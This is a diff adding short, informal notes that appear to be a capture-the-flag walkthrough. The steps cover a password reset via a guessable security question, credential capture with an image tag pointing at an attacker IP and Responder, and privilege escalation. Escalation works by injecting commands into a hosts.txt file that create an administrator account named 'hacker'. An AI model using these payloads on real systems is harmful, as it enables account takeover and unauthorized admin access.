@@ -1,0 +1,25 @@
+we first saw the website it had ==reset== password button. it asked for pet name and in a picture on website
+
+there was a girl with dog. we saw the name of the picture anad it was 2 names so we rested her password
+
+and with the creds we got out 1st flag .
+
+we did smb and we saw spark files on shared
+
+so we dwlded `==spark== 2.8.3` it had a vuln that ==<img src=10.10.14.10/aa >==
+
+on responder we get password
+
+so  we logged on winrm now we saw we are in group Account operator
+
+we can change password for all except for Admin
+
+so there was a ps1 file on running it we saw a dir and there was an error not found so we we upload hosst.txt file
+
+and it was read it to update the admins password
+
+we accessed brittney from smb and uploaded a hosts.txt file with payload
+
+`; net user hacker hello!123 /add;net localgroup Administrators hacker /add`
+
+and it updated admins password
